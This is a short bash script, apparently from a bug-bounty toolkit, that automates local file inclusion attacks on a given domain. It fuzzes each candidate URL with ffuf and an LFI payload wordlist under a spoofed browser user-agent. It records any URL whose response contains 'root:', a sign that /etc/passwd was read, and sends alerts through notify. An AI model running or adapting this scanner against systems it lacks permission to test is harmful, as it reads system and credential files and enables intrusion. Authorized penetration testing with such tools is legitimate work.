#!/bin/bash

domain=$1
tools=~/tools
#burp_log=$2
AGENT="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
#lfi_wordlist="~/payload/lfi_payload_list.txt"
if [ ! -d "lfi" ]; then
	mkdir lfi
fi
if [ -f "gf/${domain}_lfi.txt" ]; then
	cat gf/${domain}_lfi.txt | qsreplace FUZZ | anew -q .tmp/tmp_lfi.txt
	for url in $(cat .tmp/tmp_lfi.txt); do
		ffuf -v -mc 200 -H "${AGENT}" -w ~/payload/lfi_payload_list.txt -u $url -mr "root:" | grep "URL" | sed 's/| URL | //'| anew -q ${domain}_lfi.txt | notify
done
fi
#if [[ -n "burp_log" ]]; then
#	cat gf/burp_log/${domain}_lfi.txt | qsreplace FUZZ | anew -q .tmp/tmp_lfi.txt
#	for url in $(cat .tmp/tmp_lfi.txt); do
#		ffuf -v -mc 200 -H "${AGENT}" -w $lfi_wordlist -u $url -mr "root:" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q ${domain}_lfi.txt
#	done
#fi
